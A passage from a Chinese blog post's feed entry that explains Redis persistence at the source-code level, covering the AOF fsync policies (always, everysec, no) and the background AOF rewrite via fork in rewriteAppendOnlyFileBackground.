AOF_FSYNC_ALWAYS) &#123;</span><br><span class="line">        <span class="comment">/* aof_fsync is defined as fdatasync() for Linux in order to avoid</span></span><br><span class="line"><span class="comment">         * flushing metadata. */</span></span><br><span class="line">        <span class="built_in">aof_fsync</span>(server.aof_fd); <span class="comment">/* Let&#x27;s try to get this data on the disk */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 更新最后一次执行 fsnyc 的时间</span></span><br><span class="line">        server.aof_last_fsync = server.unixtime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 策略为每秒 fsnyc ，并且距离上次 fsync 已经超过 1 秒</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((server.aof_fsync == AOF_FSYNC_EVERYSEC &amp;&amp;</span><br><span class="line">                server.unixtime &gt; server.aof_last_fsync)) &#123;</span><br><span class="line">        <span class="comment">// 放到后台执行</span></span><br><span class="line">        <span class="keyword">if</span> (!sync_in_progress) <span class="built_in">aof_background_fsync</span>(server.aof_fd);</span><br><span class="line">        <span class="comment">// 更新最后一次执行 fsync 的时间</span></span><br><span class="line">        server.aof_last_fsync = server.unixtime;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面代码中，我们可以看到执行fsync有几种可能，这些可能性通过appendfsync配置进行决定</p><table><thead><tr><th align="left">appendfsync选项的值</th><th>flushappendonlyfile函数行为</th></tr></thead><tbody><tr><td align="left">always</td><td>将aof_buf缓冲区所有内容写入并同步到AOF文件</td></tr><tr><td align="left">everysec</td><td>将aof buf缓冲区中的所有内容写入到AOF文件，如果上次同步AOF文件的时间距离现在超过一秒钟，那么再次对AOF 文件进行同步，并且这个同步操作是由一个线程专门负责执行的</td></tr><tr><td align="left">no</td><td>将aof_buf缓冲区中的所有内容写入到AOF文件，但并不对AOF文件进行同步,何时同步由操作系统来决定</td></tr></tbody></table><h2 id="AOF重写"><a href="#AOF重写" class="headerlink" title="AOF重写"></a>AOF重写</h2><p>由AOF写入原理可知，每次执行命令，都会向文件中写入命令，那么这就会导致文件较大，而且对于比如这种情况：先添加一个a键，再删除一个a键，这其实最终的效果是和最初一样的，若将两次执行命令都写入，则其实是没有用的，因此redis采用AOF重写的方式，函数为<code>rewriteAppendOnlyFileBackground</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * 以下是后台重写 AOF 文件（BGREWRITEAOF）的工作步骤：</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 1) 用户调用 BGREWRITEAOF</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 2) Redis 调用这个函数，它执行 fork() ：</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *    2a) 子进程在临时文件中对 AOF 文件进行重写</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *    2b) 父进程将新输入的写命令追加到 server.aof_rewrite_buf 中</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 3) 当步骤 2a 执行完之后，子进程结束</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 4) </span></span><br><span class="line"><span class="comment"> *    父进程会捕捉子进程的退出信号，</span></span><br><span class="line"><span class="comment"> *    如果子进程的退出状态是 OK 的话，</span></span><br><span class="line"><span class="comment"> *    那么父进程将新输入命令的缓存追加到临时文件，</span></span><br><span class="line"><span class="comment"> *    然后使用 rename(2) 对临时文件改名，用它代替旧的 AOF 文件，</span></span><br><span class="line"><span class="comment"> *    至此，后台 AOF 重写完成。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">rewriteAppendOnlyFileBackground</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="type">pid_t</span> childpid;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 已经有进程在进行 AOF 重写了</span></span><br><span class="line">    <span class="keyword">if</span> (server.aof_child_pid != <span class="number">-1</span>) <span class="keyword">return</span> REDIS_ERR;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录 fork 开始前的时间，计算 fork 耗时用</span></span><br><span class="line">    start = <span class="built_in">ustime</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((childpid = fork()) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">char</span> tmpfile[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 子进程 */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭网络连接 fd</span></span><br><span class="line">        <span class="built_in">closeListeningSockets</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 为进程设置名字，方便记认</span></span><br><span class="line">        <span class="built_in">redisSetProcTitle</span>(<span class="string">&quot;redis-aof-rewrite&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建临时文件，并进行 AOF 重写</span></span><br><span class="line">        <span class="built_in">snprintf</span>(tmpfile,<span class="number">256</span>,<span class="string">&quot;temp-rewriteaof-bg-%d.aof&quot;</span>, (<span class="type">int</span>) <span class="built_in">getpid</span>());</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">rewriteAppendOnlyFile</span>(tmpfile) == REDIS_OK) &#123;</span><br><span class="line">            <span class="type">size_t</span> private_dirty = <span class="built_in">zmalloc_get_private_dirty</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (private_dirty) &#123;</span><br><span class="line">                <span class="built_in">redisLog</span>(REDIS_NOTICE,</span><br><span class="line">                    <span class="string">&quot;AOF rewrite: %zu MB of memory used by copy-on-write&quot;</span>,</span><br><span class="line">                    private_dirty/(<span class="number">1024</span>*<span class="number">1024</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 发送重写成功信号</span></span><br><span class="line">            <span class="built_in">exitFromChild</span>(<span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 发送重写失败信号</span></span><br><span class="line">            <span class="built_in">exitFromChild</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* 父进程 */</span></span><br><span class="line">        <span class="comment">// 记录执行 fork 所消耗的时间</span></span><br><span class="line">        server.stat_fork_time = <span class="built_in">ustime</span>()-start;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (childpid == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">redisLog</span>(REDIS_WARNING,</span><br><span class="line">                <span class="string">&quot;Can&#x27;t rewrite append only file in background: fork: %s&quot;</span>,</span><br><span class="line">                <span class="built_in">strerror</span>(errno));</span><br><span class="line">            <span class="keyword">return</span> REDIS_ERR;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">redisLog</span>(REDIS_NOTICE,</span><br><span class="line">            <span class="string">&quot;Background append only file rewriting started by pid %d&quot;</span>,childpid);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 记录 AOF 重写的信息</span></span><br><span class="line">        server.aof_rewrite_scheduled = <span class="number">0</span>;</span><br><span class="line">        server.aof_rewrite_time_start = <span class="built_in">time</span>(<span class="literal">NULL</span>);</span><br><span class="line">        server.aof_child_pid = childpid;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭字典自动 rehash</span></span><br><span class="line">        <span class="built_in">updateDictResizePolicy</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* </span></span><br><span class="line"><span class="comment">         * 将 aof_selected_db 设为 -1 ，</span></span><br><span class="line"><span class="comment">         * 强制让 feedAppendOnlyFile() 下次执行时引发一个 SELECT 命令，</span></span><br><span class="line"><span class="comment">         * 从而确保之后新添加的命令会设置到正确的数据库中</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        server.aof_selected_db = <span class="number">-1</span>;</span><br><span class="line">        <span class="built_in">replicationScriptCacheFlush</span>();</span><br><span class="line">        <span class="keyword">return</span> REDIS_OK;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> REDIS_OK; <span class="comment">/* unreached */</span></span><br></pre></td></tr></table></figure><p>AOF重写的原理，其实是直接读取当前的数据库的值，最后使用一条写语句就可以实现AOF重写</p><p>而且AOF重写是放在后台子进程执行，这样可以避免效率太低，但是使用子进程执行重写方式，则在重写过程中，父进程还会执行新的写命令，因此这段事件的命令也要被记录下来，最后再次同步给子进程</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;博客网址：&lt;a href=&quot;http://www.shicoder.top/&quot;&gt;www.shicoder.top&lt;/a&gt;&lt;br&gt;微信：18223081347&lt;br&gt;欢迎加群聊天 ：452380935&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;本次主要是对redis中著名的持久化策略进行代码层面描述，主要包括RDB持久化和AOF持久化&lt;/p&gt;</summary>
    
    
    
    <category term="redis" scheme="http://www.shicoder.top/categories/redis/"/>
    
    
    <category term="导航" scheme="http://www.shicoder.top/tags/%E5%AF%BC%E8%88%AA/"/>
    
    <category term="分享" scheme="http://www.shicoder.top/tags/%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
</feed>
